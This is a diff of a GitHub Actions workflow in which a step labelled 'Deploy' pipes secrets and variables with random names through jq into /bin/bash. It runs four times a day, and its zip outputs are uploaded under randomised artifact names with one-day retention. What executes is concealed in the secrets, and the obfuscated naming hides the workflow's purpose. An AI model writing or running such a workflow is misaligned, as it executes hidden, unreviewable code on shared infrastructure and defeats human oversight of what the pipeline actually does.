@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '44 0,6,12,18 * * *'
+    - cron: '51 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -17,19 +17,16 @@ jobs:
         uses: actions/checkout@v4
       - name: Deploy
         env:
-          oge1628: ${{ secrets.oge1628 }}
+          p3464: ${{ secrets.p3464 }}
         run: |
-          printf '%s' "$oge1628" | jq -r .x613 | /bin/bash
-          printf '%s' "$ymvng2444" | jq -r .vcjb73 | /bin/bash
-          printf '%s' "$mid5" | jq -r .kd131 | /bin/bash
-          echo $mo636 | jq -r .r49747 | /bin/bash
-          echo $ax3634 | jq -r .hjzoh531 | /bin/bash
-          printf '%s' "$dd72" | jq -r .otl21545 | /bin/bash
+          printf '%s' "$p3464" | jq -r .ju26 | /bin/bash
+          echo $np10410 | jq -r .d20 | /bin/bash
+          echo $mq6944 | jq -r .kve200 | /bin/bash
 
       - name: Save results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: lPxuhRXb
+          name: fG9ug0y8
           path: "*.zip"
           retention-days: 1
